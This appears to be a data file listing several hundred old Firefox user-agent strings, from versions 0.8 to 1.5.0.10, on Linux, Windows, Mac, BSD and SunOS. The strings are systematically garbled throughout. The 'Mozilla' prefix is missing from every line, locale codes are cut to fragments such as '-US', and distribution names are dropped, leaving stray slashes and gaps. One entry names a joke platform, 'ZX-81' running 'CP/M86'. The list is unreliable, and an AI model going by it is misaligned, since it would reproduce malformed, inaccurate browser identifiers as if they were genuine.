	"/5.0 X11; U; Linux i686; -US; rv:1.8.0.10 Gecko/20070302 /dapper-security Firefox/1.5.0.10"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.0.10 Gecko/20070226  /1.5.0.10-0.1.el4 Firefox/1.5.0.10"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.0.10 Gecko/20070226 /1.5.0.10-1.fc6 Firefox/1.5.0.10 pango-"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.0.10 Gecko/20070223 CentOS/1.5.0.10-0.1.el4.centos Firefox/1.5.0.10"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.0.10 Gecko/20070221  /1.5.0.10-0.1.el4 Firefox/1.5.0.10"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.0.10 Gecko/20070216 Firefox/1.5.0.10"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.0.10 Gecko/20060911 SUSE/1.5.0.10-0.2 Firefox/1.5.0.10"
	"/5.0 X11; U; Linux i686; -CA; rv:1.8.0.10 Gecko/20070223 /1.5.0.10-1.fc5 Firefox/1.5.0.10"
	"/5.0 X11; U; Linux i686; cs-CZ; rv:1.8.0.10 Gecko/20070313 /1.5.0.10-5.fc6 Firefox/1.5.0.10"
	"/5.0 X11; U; Linux i686 x86_64; -US; rv:1.8.0.10 Gecko/20060911 SUSE/1.5.0.10-0.2 Firefox/1.5.0.10"
	"/5.0 Windows; U; Windows NT 5.1; sv-SE; rv:1.8.0.10 Gecko/20070216 Firefox/1.5.0.10"
	"/5.0 Windows; U; Windows NT 5.1; ; rv:1.8.0.10 Gecko/20070216 Firefox/1.5.0.10"
	"/5.0 Windows; U; Windows NT 5.1; fr; rv:1.8.0.10 Gecko/20070216 Firefox/1.5.0.10"
	"/5.0 ZX-81; U; CP/M86; -US; rv:1.8.0.1 Gecko/20060111 Firefox/1.5.0.1"
	"/5.0 X11; U; SunOS ; -US; rv:1.8.0.1 Gecko/20060206 Firefox/1.5.0.1"
	"/5.0 X11; U; SunOS ; -GB; rv:1.8.0.1 Gecko/20060206 Firefox/1.5.0.1"
	"/5.0 X11; U; OpenBSD i386; -US; rv:1.8.0.1 Gecko/20060213 Firefox/1.5.0.1"
	"/5.0 X11; U; Linux x86_64; pl-PL; rv:1.8 Gecko/20051128 SUSE/1.5-0.1 Firefox/1.5.0.1"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.8.0.1 Gecko/20060313 /1.5.0.1-9 Firefox/1.5.0.1 pango-"
	"/5.0 X11; U; Linux i686; rv:1.8.0.1 Gecko/20060124 Firefox/1.5.0.1"
	"/5.0 X11; U; Linux i686; pl; rv:1.8.0.1 Gecko/20060313 /1.5.0.1-9 Firefox/1.5.0.1 pango- Mnenhy/0.7.3.0"
	"/5.0 X11; U; Linux i686; pl; rv:1.8.0.1 Gecko/20060201 Firefox/1.5.0.1 Swiftfox Mnenhy/0.7.3.0"
	"/5.0 X11; U; Linux i686; pl; rv:1.8.0.1 Gecko/20060124 Firefox/1.5.0.1 "
	"/5.0 X11; U; Linux i686; pl; rv:1.8.0.1 Gecko/20060124 Firefox/1.5.0.1"
	"/5.0 X11; U; Linux i686; pl-PL; rv:1.8.0.1 Gecko/20060313 /1.5.0.1-9 Firefox/1.5.0.1 pango- Mnenhy/0.7.3.0"
	"/5.0 X11; U; Linux i686; ; rv:1.8.0.1 Gecko/20060124 Firefox/1.5.0.1"
	"/5.0 X11; U; Linux i686; fr; rv:1.8.0.1 Gecko/20060124 Firefox/1.5.0.1"
	"/5.0 X11; U; Linux i686; es-ES; rv:1.8.0.1 Gecko/20060124 Firefox/1.5.0.1"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.0.7 Gecko/20060911  /1.5.0.7-0.1.el4 Firefox/1.5.0.1 pango-"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.0.1 Gecko/20060404 Firefox/1.5.0.1"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.0.1 Gecko/20060324 /dapper Firefox/1.5.0.1"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.0.1 Gecko/20060313 /1.5.0.1-9 Firefox/1.5.0.1 pango-"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.0.1 Gecko/20060313 /+1.5.0.1-4 Firefox/1.5.0.1"
	"/5.0 X11; Linux i686; U; ; rv:1.8.0 Gecko/20060728 Firefox/1.5.0"
	"/5.0 Windows NT 5.2; U; ; rv:1.8.0 Gecko/20060728 Firefox/1.5.0"
	"/5.0 Windows NT 5.1; U; tr; rv:1.8.0 Gecko/20060728 Firefox/1.5.0"
	"/5.0 Windows NT 5.1; U; ; rv:1.8.0 Gecko/20060728 Firefox/1.5.0"
	"/5.0 Windows NT 5.1; U; ; rv:1.8.0 Gecko/20060728 Firefox/1.5.0"
	"/5.0 Windows 98; U; ; rv:1.8.0 Gecko/20060728 Firefox/1.5.0"
	"/5.0 Macintosh; PPC Mac OS X; U; ; rv:1.8.0 Gecko/20060728 Firefox/1.5.0"
	"/5.0 X11; U; SunOS ; -US; rv:1.8 Gecko/20051130 Firefox/1.5"
	"/5.0 X11; U; NetBSD i386; -US; rv:1.8 Gecko/20060104 Firefox/1.5"
	"/5.0 X11; U; Linux x86_64; fr; rv:1.8 Gecko/20051231 Firefox/1.5"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.8 Gecko/20051212 Firefox/1.5"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.8 Gecko/20051201 Firefox/1.5"
	"/5.0 X11; U; Linux i686; -BR; rv:1.8 Gecko/20051111 Firefox/1.5"
	"/5.0 X11; U; Linux i686; pl; rv:1.8 Gecko/20051111 Firefox/1.5 "
	"/5.0 X11; U; Linux i686; pl; rv:1.8 Gecko/20051111 Firefox/1.5"
	"/5.0 X11; U; Linux i686; ; rv:1.6 Gecko/20051114 Firefox/1.5"
	"/5.0 X11; U; Linux i686; -LT; rv:1.6 Gecko/20051114 Firefox/1.5"
	"/5.0 X11; U; Linux i686; ; rv:1.8 Gecko/20060113 Firefox/1.5"
	"/5.0 X11; U; Linux i686; fr; rv:1.8 Gecko/20060110 /-4 Firefox/1.5"
	"/5.0 X11; U; Linux i686; fr; rv:1.8 Gecko/20051111 Firefox/1.5"
	"/5.0 X11; U; Linux i686; fr-FR; rv:1.8 Gecko/20051111 Firefox/1.5"
	"/5.0 X11; U; Linux i686; -US; rv:1.8 Gecko/20060806 Firefox/1.5"
	"/5.0 X11; U; Linux i686; -US; rv:1.8 Gecko/20060130 /-4ubuntu6 Firefox/1.5"
	"/5.0 X11; U; Linux i686; -US; rv:1.8 Gecko/20060119 /-4ubuntu3 Firefox/1.5"
	"/5.0 X11; U; Linux i686; -US; rv:1.8 Gecko/20060118 Firefox/1.5"
	"/5.0 X11; U; Linux i686; -US; rv:1.8 Gecko/20060111 Firefox/1.5"
	"/5.0 X11; U; Linux i686; -US; rv:1.8 Gecko/20060110 /-4 Firefox/1.5"
	"/5.0 X11; U; Linux i686; -US; rv:1.8b5 Gecko/20051008 /1.5-0.5.0.beta2 Firefox/1.4.1"
	"/5.0 X11; U; Linux i686; -US; rv:1.8b5 Gecko/20051006 Firefox/1.4.1"
	"/5.0 Windows; U; Windows NT 5.2; -US; rv:1.8b5 Gecko/20051006 Firefox/1.4.1"
	"/5.0 Windows; U; Windows NT 5.1; tr; rv:1.8b5 Gecko/20051006 Firefox/1.4.1"
	"/5.0 Windows; U; Windows NT 5.1; ; rv:1.8b5 Gecko/20051006 Firefox/1.4.1"
	"/5.0 Windows; U; Windows NT 5.1; -US; rv:1.8b5 Gecko/20051006 Firefox/1.4.1"
	"/5.0 Macintosh; U; PPC Mac OS X Mach-O; -US; rv:1.8b5 Gecko/20051006 Firefox/1.4.1"
	"/5.0 Windows; U; Windows NT 5.1; -US; rv:1.8b4 Gecko/20050908 Firefox/1.4"
	"/5.0 Windows; U; Windows NT 5.0; -US; rv:1.8b4 Gecko/20050908 Firefox/1.4"
	"/5.0 Macintosh; U; PPC Mac OS X Mach-O; -US; rv:1.8b4 Gecko/20050908 Firefox/1.4"
	"/5.0 Windows; U; Windows NT 5.1; -US; rv:1.8.1.21 Gecko/20090403 Firefox/1.1.16"
	"/5.0 X11; U; Linux i686; -US; rv:1.7.13 Gecko/20060413  /1.0.8-1.4.1 Firefox/1.0.8"
	"/5.0 X11; U; Linux i686; -US; rv:1.7.13 Gecko/20060411 Firefox/1.0.8 SUSE/1.0.8-0.2"
	"/5.0 X11; U; Linux i686; -US; rv:1.7.10 Gecko/20060410 Firefox/1.0.8 /1.0.6-16.5.20060mdk 2006.0"
	"/5.0 X11; U; Linux i686; -GB; rv:1.7.13 Gecko/20060418 /1.0.8-1.1.fc4 Firefox/1.0.8"
	"/5.0 X11; U; Linux i686; -DE; rv:1.7.13 Gecko/20060418 Firefox/1.0.8   1.0.8"
	"/5.0 X11; U; Linux i686; -DE; rv:1.7.13 Gecko/20060411 Firefox/1.0.8 SUSE/1.0.8-0.2"
	"/5.0 X11; U; Linux i686; -DK; rv:1.7.13 Gecko/20060411 Firefox/1.0.8 SUSE/1.0.8-0.2"
	"/5.0 X11; U; FreeBSD i386; -US; rv:1.7.12 Gecko/20051105 Firefox/1.0.8"
	"/5.0 Windows; U; Windows NT 5.1; -US; rv:1.7.13 Gecko/20060410 Firefox/1.0.8"
	"/5.0 Windows; U; Win98; -US; rv:1.7.13 Gecko/20060410 Firefox/1.0.8"
	"/5.0 Macintosh; U; PPC Mac OS X Mach-O; -US; rv:1.7.13 Gecko/20060410 Firefox/1.0.8"
	"/5.0 X11; U; x86_64 Linux; en_US; rv:1.7.12 Gecko/20050915 Firefox/1.0.7"
	"/5.0 X11; U; SunOS ; -US; rv:1.7.12 Gecko/20050927 Firefox/1.0.7"
	"/5.0 X11; U; SunOS ; -US; rv:1.7.12 Gecko/20050922 Firefox/1.0.7"
	"/5.0 X11; U; SunOS i86pc; -US; rv:1.7.12 Gecko/20051121 Firefox/1.0.7   1.0.7"
	"/5.0 X11; U; Linux x86_64; fr; rv:1.7.12 Gecko/20050922 /1.0.7-1.1.fc4 Firefox/1.0.7"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.7.12 Gecko/20060202 CentOS/1.0.7-1.4.3.centos4 Firefox/1.0.7"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.7.12 Gecko/20051218 Firefox/1.0.7"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.7.12 Gecko/20051127 Firefox/1.0.7"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.7.12 Gecko/20051010 Firefox/1.0.7   1.0.7"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.7.12 Gecko/20051010 Firefox/1.0.7"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.7.12 Gecko/20050922 /1.0.7-1.1.fc4 Firefox/1.0.7"
	"/5.0 X11; U; Linux ppc; -US; rv:1.7.12 Gecko/20051222 Firefox/1.0.7"
	"/5.0 X11; U; Linux ppc; -DK; rv:1.7.12 Gecko/20051010 Firefox/1.0.7   1.0.7"
	"/5.0 X11; U; Linux i686; -BR; rv:1.7.12 Gecko/20051010 Firefox/1.0.7   1.0.7"
	"/5.0 X11; U; Linux i686; pl-PL; rv:1.7.12 Gecko/20051010 Firefox/1.0.7   1.0.7"
	"/5.0 X11; U; Linux i686; -IT; rv:1.7.12 Gecko/20051010 Firefox/1.0.7   1.0.7"
	"/5.0 X11; U; Linux i686; -HU; rv:1.7.12 Gecko/20051010 Firefox/1.0.7   1.0.7"
	"/5.0 X11; U; Linux i686; fr; rv:1.7.12 Gecko/20051010 Firefox/1.0.7   1.0.7"
	"/5.0 X11; U; Linux i686; fr; rv:1.7.12 Gecko/20050922 Firefox/1.0.7   1.0.7-1"
	"/5.0 X11; U; Linux i686; fr; rv:1.7.12 Gecko/20050922 /1.0.7-1.1.fc4 Firefox/1.0.7"
	"/5.0 X11; U; OpenBSD i386; -US; rv:1.7.10 Gecko/20050919 No IDN Firefox/1.0.6"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.7.10 Gecko/20050724 Firefox/1.0.6"
	"/5.0 X11; U; Linux i686; -BR; rv:1.7.10 Gecko/20050717 Firefox/1.0.6"
	"/5.0 X11; U; Linux i686; pl-PL; rv:1.7.10 Gecko/20050730 Firefox/1.0.6   1.0.6-2"
	"/5.0 X11; U; Linux i686; pl-PL; rv:1.7.10 Gecko/20050717 Firefox/1.0.6"
	"/5.0 X11; U; Linux i686; fr; rv:1.7.10 Gecko/20050721 Firefox/1.0.6   1.0.6"
	"/5.0 X11; U; Linux i686; fr-FR; rv:1.7.10 Gecko/20050716 Firefox/1.0.6"
	"/5.0 X11; U; Linux i686; -US; rv:1.7.10 Gecko/20051111 Firefox/1.0.6"
	"/5.0 X11; U; Linux i686; -US; rv:1.7.10 Gecko/20051106 Firefox/1.0.6"
	"/5.0 X11; U; Linux i686; -US; rv:1.7.10 Gecko/20050920 Firefox/1.0.6"
	"/5.0 X11; U; Linux i686; -US; rv:1.7.10 Gecko/20050918 Firefox/1.0.6"
	"/5.0 X11; U; Linux i686; -US; rv:1.7.10 Gecko/20050911 Firefox/1.0.6   1.0.6-5"
	"/5.0 X11; U; Linux i686; -US; rv:1.7.10 Gecko/20050815 Firefox/1.0.6"
	"/5.0 X11; U; Linux i686; -US; rv:1.7.10 Gecko/20050811 Firefox/1.0.6"
	"/5.0 X11; U; Linux i686; -US; rv:1.7.10 Gecko/20050721 Firefox/1.0.6   1.0.6"
	"/5.0 X11; U; Linux i686; -US; rv:1.7.10 Gecko/20050720 /1.0.6-.4.4.0 Firefox/1.0.6"
	"/5.0 X11; U; Linux i686; -US; rv:1.7.10 Gecko/20050720 /1.0.6-1.1.fc3 Firefox/1.0.6"
	"/5.0 X11; U; Linux i686; -US; rv:1.7.10 Gecko/20050719  /1.0.6-1.4.1 Firefox/1.0.6"
	"/5.0 X11; U; Linux i686; -US; rv:1.7.10 Gecko/20050716 Firefox/1.0.6"
	"/5.0 X11; U; Linux i686; -US; rv:1.7.10 Gecko/20050715 Firefox/1.0.6 SUSE/1.0.6-16"
	"/5.0 X11; U; Linux i686; -US; rv:1.7.9 Gecko/20050711 Firefox/1.0.5"
	"/5.0 Windows; U; WinNT4.0; -US; rv:1.7.9 Gecko/20050711 Firefox/1.0.5"
	"/5.0 Windows; U; Windows NT5.1; ; rv:1.7.10 Gecko/20050716 Firefox/1.0.5"
	"/5.0 Windows; U; Windows NT 5.2; -US; rv:1.7.9 Gecko/20050711 Firefox/1.0.5"
	"/5.0 Windows; U; Windows NT 5.1; ; rv:1.7.10 Gecko/20050716 Firefox/1.0.5"
	"/5.0 Windows; U; Windows NT 5.1; -US; rv:1.7.9 Gecko/20050711 Firefox/1.0.5 ax"
	"/5.0 Windows; U; Windows NT 5.1; -US; rv:1.7.9 Gecko/20050711 Firefox/1.0.5"
	"/5.0 Windows; U; Windows NT 5.0; -US; rv:1.7.9 Gecko/20050711 Firefox/1.0.5"
	"/5.0 Windows; U;  9x 4.90; -US; rv:1.7.9 Gecko/20050711 Firefox/1.0.5"
	"/5.0 Macintosh; U; PPC Mac OS X Mach-O; -US; rv:1.7.9 Gecko/20050711 Firefox/1.0.5"
	"/5.0 X11; U; SunOS ; -US; rv:1.7.8 Gecko/20050512 Firefox/1.0.4"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.7.8 Gecko/20050511 Firefox/1.0.4"
	"/5.0 X11; U; Linux i686; fr; rv:1.7.8 Gecko/20050524 /1.0.4-4 Firefox/1.0.4"
	"/5.0 X11; U; Linux i686; fr; rv:1.7.10 Gecko/20050925 Firefox/1.0.4   1.0.4-2sarge5"
	"/5.0 X11; U; Linux i686; fr-FR; rv:1.7.8 Gecko/20050511 Firefox/1.0.4"
	"/5.0 X11; U; Linux i686; fr-FR; rv:1.7.10 Gecko/20050925 Firefox/1.0.4   1.0.4-2sarge5"
	"/5.0 X11; U; Linux i686; -US; rv:1.7.8 Gecko/20050610 Firefox/1.0.4   1.0.4-3"
	"/5.0 X11; U; Linux i686; -US; rv:1.7.8 Gecko/20050524 /1.0.4-4 Firefox/1.0.4"
	"/5.0 X11; U; Linux i686; -US; rv:1.7.8 Gecko/20050523 Firefox/1.0.4"
	"/5.0 X11; U; Linux i686; -US; rv:1.7.8 Gecko/20050517 Firefox/1.0.4   1.0.4-2"
	"/5.0 X11; U; Linux i686; -US; rv:1.7.8 Gecko/20050513 Firefox/1.0.4"
	"/5.0 X11; U; Linux i686; -US; rv:1.7.8 Gecko/20050513 /1.0.4-1.3.1 Firefox/1.0.4"
	"/5.0 X11; U; Linux i686; -US; rv:1.7.8 Gecko/20050512 Firefox/1.0.4"
	"/5.0 X11; U; Linux i686; -US; rv:1.7.8 Gecko/20050511 Firefox/1.0.4 SUSE/1.0.4-1.1"
	"/5.0 X11; U; Linux i686; -US; rv:1.7.8 Gecko/20050511 Firefox/1.0.4"
	"/5.0 X11; U; Linux i686; -US; rv:1.7.12 Gecko/20051010 Firefox/1.0.4   1.0.7"
	"/5.0 X11; U; Linux i686; -US; rv:1.7.10 Gecko/20070530 Firefox/1.0.4   1.0.4-2sarge17"
	"/5.0 X11; U; Linux i686; -US; rv:1.7.10 Gecko/20070116 Firefox/1.0.4   1.0.4-2sarge15"
	"/5.0 X11; U; Linux i686; -US; rv:1.7.10 Gecko/20061113 Firefox/1.0.4   1.0.4-2sarge13"
	"/5.0 X11; U; Linux i686; -US; rv:1.7.10 Gecko/20060927 Firefox/1.0.4   1.0.4-2sarge12"
	"/5.0 X11; U; Linux i686; -US; rv:1.7.7 Gecko/20050421 Firefox/1.0.3   1.0.3-2"
	"/5.0 X11; U; Linux i686; -GB; rv:1.7.7 Gecko/20050414 Firefox/1.0.3"
	"/5.0 X11; U; FreeBSD i386; -US; rv:1.7.7 Gecko/20060303 Firefox/1.0.3"
	"/5.0 X11; U; FreeBSD i386; -US; rv:1.7.7 Gecko/20050420 Firefox/1.0.3"
	"/5.0 Windows; U; Windows NT 5.1; -RU; rv:1.7.7 Gecko/20050414 Firefox/1.0.3"
	"/5.0 Windows; U; Windows NT 5.1; -IT; rv:1.7.7 Gecko/20050414 Firefox/1.0.3"
	"/5.0 Windows; U; Windows NT 5.1; fr-FR; rv:1.7.7 Gecko/20050414 Firefox/1.0.3"
	"/5.0 Windows; U; Windows NT 5.1; es-ES; rv:1.7.7 Gecko/20050414 Firefox/1.0.3"
	"/5.0 Windows; U; Windows NT 5.1; -US; rv:1.7.7 Gecko/20050414 Firefox/1.0.3 ax"
	"/5.0 Windows; U; Windows NT 5.1; -US; rv:1.7.7 Gecko/20050414 Firefox/1.0.3"
	"/5.0 Windows; U; Windows NT 5.1; -GB; rv:1.7.7 Gecko/20050414 Firefox/1.0.3"
	"/5.0 Windows; U; Windows NT 5.1; -DE; rv:1.7.7 Gecko/20050414 Firefox/1.0.3"
	"/5.0 Windows; U; Windows NT 5.1; -DK; rv:1.7.7 Gecko/20050414 Firefox/1.0.3"
	"/5.0 Windows; U; Windows NT 5.0; fr-FR; rv:1.7.7 Gecko/20050414 Firefox/1.0.3"
	"/5.0 Windows; U; Windows NT 5.0; -US; rv:1.7.7 Gecko/20050414 Firefox/1.0.3"
	"/5.0 Windows; U; Windows NT 5.0; -DE; rv:1.7.7 Gecko/20050414 Firefox/1.0.3"
	"/5.0 Windows; U; Win98; fr-FR; rv:1.7.7 Gecko/20050414 Firefox/1.0.3"
	"/5.0 Windows; U; Win98; es-ES; rv:1.7.7 Gecko/20050414 Firefox/1.0.3"
	"/5.0 Windows; U; Win98; -US; rv:1.7.7 Gecko/20050414 Firefox/1.0.3"
	"/5.0 Windows; U; Win98; -DE; rv:1.7.7 Gecko/20050414 Firefox/1.0.3"
	"/5.0 X11; U; Linux x86_64; nl-NL; rv:1.7.6 Gecko/20050318 Firefox/1.0.2"
	"/5.0 X11; U; Linux i686; -RU; rv:1.7.6 Gecko/20050318 Firefox/1.0.2"
	"/5.0 X11; U; Linux i686; -US; rv:1.7.6 Gecko/20050317 Firefox/1.0.2"
	"/5.0 X11; U; Linux i686; -AT; rv:1.7.6 Gecko/20050325 Firefox/1.0.2   1.0.2-1"
	"/5.0 Windows; U; Windows NT 5.2; -DE; rv:1.7.6 Gecko/20050321 Firefox/1.0.2"
	"/5.0 Windows; U; Windows NT 5.1; tr-TR; rv:1.7.6 Gecko/20050321 Firefox/1.0.2"
	"/5.0 Windows; U; Windows NT 5.1; sv-SE; rv:1.7.6 Gecko/20050318 Firefox/1.0.2"
	"/5.0 Windows; U; Windows NT 5.1; ro-RO; rv:1.7.6 Gecko/20050318 Firefox/1.0.2"
	"/5.0 Windows; U; Windows NT 5.1; nl-NL; rv:1.7.6 Gecko/20050318 Firefox/1.0.2"
	"/5.0 Windows; U; Windows NT 5.1; -IT; rv:1.7.6 Gecko/20050318 Firefox/1.0.2"
	"/5.0 Windows; U; Windows NT 5.1; fr-FR; rv:1.7.6 Gecko/20050318 Firefox/1.0.2"
	"/5.0 Windows; U; Windows NT 5.1; -US; rv:1.7.6 Gecko/20050317 Firefox/1.0.2 ax"
	"/5.0 Windows; U; Windows NT 5.1; -US; rv:1.7.6 Gecko/20050317 Firefox/1.0.2"
	"/5.0 Windows; U; Windows NT 5.1; -GB; rv:1.7.6 Gecko/20050321 Firefox/1.0.2"
	"/5.0 Windows; U; Windows NT 5.1; -DE; rv:1.7.6 Gecko/20050321 Firefox/1.0.2"
	"/5.0 Windows; U; Windows NT 5.0; -US; rv:1.7.6 Gecko/20050317 Firefox/1.0.2"
	"/5.0 Windows; U; Windows NT 5.0; -GB; rv:1.7.6 Gecko/20050321 Firefox/1.0.2"
	"/5.0 Windows; U; Windows NT 5.0; -DE; rv:1.7.6 Gecko/20050321 Firefox/1.0.2"
	"/5.0 Windows; U; Win98; fr-FR; rv:1.7.6 Gecko/20050318 Firefox/1.0.2"
	"/5.0 Windows; U; Win98; -US; rv:1.7.6 Gecko/20050317 Firefox/1.0.2 ax"
	"/5.0 X11; U; Linux i686; -US; rv:1.7.6 Gecko/20050317 Firefox/1.0.1"
	"/5.0 X11; U; Linux i686; -US; rv:1.7.6 Gecko/20050311 Firefox/1.0.1"
	"/5.0 X11; U; Linux i686; -US; rv:1.7.6 Gecko/20050310 Firefox/1.0.1"
	"/5.0 X11; U; Linux i686; -US; rv:1.7.6 Gecko/20050225 Firefox/1.0.1"
	"/5.0 X11; U; Linux i686; -DE; rv:1.7.6 Gecko/20050322 Firefox/1.0.1"
	"/5.0 X11; U; Linux i686; -DE; rv:1.7.6 Gecko/20050306 Firefox/1.0.1   1.0.1-2"
	"/5.0 X11; U; Linux i686; cs-CZ; rv:1.7.6 Gecko/20050226 Firefox/1.0.1"
	"/5.0 Windows; U; WinNT4.0; -DE; rv:1.7.6 Gecko/20050226 Firefox/1.0.1"
	"/5.0 Windows; U; Windows NT 5.1; fr-FR; rv:1.7.6 Gecko/20050226 Firefox/1.0.1"
	"/5.0 Windows; U; Windows NT 5.1; -US; rv:1.7.6 Gecko/20050225 Firefox/1.0.1"
	"/5.0 Windows; U; Windows NT 5.1; -US; rv:1.7.6 Gecko/20050223 Firefox/1.0.1"
	"/5.0 Windows; U; Windows NT 5.1; -GB; rv:1.7.6 Gecko/20050226 Firefox/1.0.1"
	"/5.0 Windows; U; Windows NT 5.1; -DE; rv:1.7.6 Gecko/20050226 Firefox/1.0.1"
	"/5.0 Windows; U; Windows NT 5.1; -DE; rv:1.7.6 Gecko/20050223 Firefox/1.0.1"
	"/5.0 Windows; U; Windows NT 5.0; -US; rv:1.7.6 Gecko/20050225 Firefox/1.0.1"
	"/5.0 Windows; U; Windows NT 5.0; -DE; rv:1.7.6 Gecko/20050226 Firefox/1.0.1"
	"/5.0 Windows; U; Windows NT 5.0; -DE; rv:1.7.6 Gecko/20050223 Firefox/1.0.1"
	"/5.0 Windows; U; Windows NT 5.0; -DE; rv:1.6 Gecko/20040206 Firefox/1.0.1"
	"/5.0 Windows; U; Win98; fr-FR; rv:1.7.6 Gecko/20050226 Firefox/1.0.1"
	"/5.0 Windows; U; Win98; -US; rv:1.7.6 Gecko/20050225 Firefox/1.0.1"
	"/5.0 X11; U; Linux i686; ; rv:1.8b4 Gecko/20050827 Firefox/1.0+"
	"/5.0 Windows; U; Windows NT 5.1; -US; rv:1.8b4 Gecko/20050729 Firefox/1.0+"
	"/5.0 X11; U; SunOS i86pc; -US; rv:1.7.5 Gecko/20041109 Firefox/1.0"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.7.6 Gecko/20050405 Firefox/1.0   1.0.2"
	"/5.0 X11; U; Linux i686; -US; rv:1.7.6 Gecko/20050405 Firefox/1.0   1.0.2"
	"/5.0 X11; U; Linux i686; -US; rv:1.7.5 Gecko/20050814 Firefox/1.0"
	"/5.0 X11; U; Linux i686; -US; rv:1.7.5 Gecko/20050221 Firefox/1.0"
	"/5.0 X11; U; Linux i686; -US; rv:1.7.5 Gecko/20050210 Firefox/1.0   1.0+.1-6"
	"/5.0 X11; U; Linux i686; -US; rv:1.7.5 Gecko/20041218 Firefox/1.0"
	"/5.0 X11; U; Linux i686; -US; rv:1.7.5 Gecko/20041215 Firefox/1.0  /1.0-12.EL4"
	"/5.0 X11; U; Linux i686; -US; rv:1.7.5 Gecko/20041204 Firefox/1.0   1.0.x.2-1"
	"/5.0 X11; U; Linux i686; -US; rv:1.7.5 Gecko/20041128 Firefox/1.0   1.0-4"
	"/5.0 X11; U; Linux i686; -US; rv:1.7.5 Gecko/20041117 Firefox/1.0   1.0-2.0.0.45.linspire0.4"
	"/5.0 X11; U; Linux i686; -US; rv:1.7.5 Gecko/20041107 Firefox/1.0"
	"/5.0 X11; U; Linux i686; -GB; rv:1.7.6 Gecko/20050405 Firefox/1.0   1.0.2"
	"/5.0 X11; U; Linux i686; -DE; rv:1.7.5 Gecko/20041108 Firefox/1.0"
	"/5.0 X11; U; Linux i686; -AT; rv:1.7.5 Gecko/20041128 Firefox/1.0   1.0-4"
	"/5.0 X11; U; FreeBSD i386; -US; rv:1.7.5 Gecko/20041114 Firefox/1.0"
	"/5.0 X11; Linux i686; rv:1.7.5 Gecko/20041108 Firefox/1.0"
	"/5.0 Windows; U; WinNT4.0; -US; rv:1.7.5 Gecko/20041107 Firefox/1.0"
	"/5.0 Windows; U; WinNT4.0; -DE; rv:1.7.5 Gecko/20041108 Firefox/1.0"
	"/5.0 Windows; U; Windows NT 5.1; zh-TW; rv:1.7.5 Gecko/20041119 Firefox/1.0"
	"/5.0 X11; U; Linux i686; -US; rv:1.7 Gecko/20040917 Firefox/0.9.3"
	"/5.0 Windows; U; Windows NT 5.1; fr; rv:1.7 Gecko/20040803 Firefox/0.9.3"
	"/5.0 Windows; U; Windows NT 5.1; -US; rv:1.7 Gecko/20040803 Firefox/0.9.3"
	"/5.0 Windows; U; Windows NT 5.1; -DE; rv:1.7 Gecko/20040803 Firefox/0.9.3"
	"/5.0 Windows; U; Windows NT 5.0; -US; rv:1.7 Gecko/20040803 Firefox/0.9.3"
	"/5.0 Windows; U; Windows NT 5.0; -DE; rv:1.7 Gecko/20040803 Firefox/0.9.3"
	"/5.0 Windows; U; Win98; -DE; rv:1.7 Gecko/20040803 Firefox/0.9.3"
	"/5.0 Windows; U;  9x 4.90; rv:1.7 Gecko/20040803 Firefox/0.9.3"
	"/5.0 X11; U; Linux i686; -US; rv:1.7 Gecko/20040802 Firefox/0.9.2"
	"/5.0 Windows; U; Windows NT 5.1; fr; rv:1.7 Gecko/20040707 Firefox/0.9.2"
	"/5.0 Windows; U; Windows NT 5.1; -US; rv:1.7 Gecko/20040707 Firefox/0.9.2"
	"/5.0 Windows; U; Windows NT 5.0; -US; rv:1.7 Gecko/20040707 Firefox/0.9.2"
	"/5.0 X11; U; Linux i686; -US; rv:1.7 Gecko/20040630 Firefox/0.9.1"
	"/5.0 Windows; U; Windows NT 5.1; -DE; rv:1.7 Gecko/20040626 Firefox/0.9.1"
	"/5.0 Windows; U; Windows NT 5.0; -DE; rv:1.7 Gecko/20040626 Firefox/0.9.1"
	"/5.0 Windows; U; Windows NT 5.1; -US; rv:1.7 Gecko/20040614 Firefox/0.9"
	"/5.0 Macintosh; U; PPC Mac OS X Mach-O; -US; rv:1.7 Gecko/20040614 Firefox/0.9"
	"/5.0 X11; U; Linux i686; -US; rv:1.6 Gecko/20040614 Firefox/0.8"
	"/5.0 X11; U; Linux i686; -US; rv:1.6 Gecko/20040225 Firefox/0.8"
	"/5.0 X11; U; Linux i686; -DE; rv:1.6 Gecko/20040207 Firefox/0.8"
	"/5.0 Windows; U; Windows NT 5.1; fr; rv:1.6 Gecko/20040206 Firefox/0.8"
	"/5.0 Windows; U; Windows NT 5.1; -US; rv:1.6 Gecko/20040206 Firefox/0.8"
	"/5.0 Windows; U; Windows NT 5.1; -DE; rv:1.6 Gecko/20040206 Firefox/0.8"
	"/5.0 Windows; U; Windows NT 5.0; -US; rv:1.6 Gecko/20040206 Firefox/0.8"
	"/5.0 Windows; U; Windows NT 5.0; -DE; rv:1.6 Gecko/20040206 Firefox/0.8"
	"/5.0 Windows; U; Win98; -US; rv:1.6 Gecko/20040206 Firefox/0.8"
	"/5.0 Windows; U;  9x 4.90; -US; rv:1.6 Gecko/20040206 Firefox/0.8"
	"/5.0 Macintosh; U; PPC Mac OS X Mach-O; -US; rv:1.6 Gecko/20040206 Firefox/0.8"
	"/5.0 X11; U; Linux i686; rv:1.7.3 Gecko/20041020 Firefox/0.10.1"
	"/5.0 X11; U; Linux i686; rv:1.7.3 Gecko/20041001 Firefox/0.10.1"
	"/5.0 X11; U; Linux i686; rv:1.7.3 Gecko/20040914 Firefox/0.10.1"
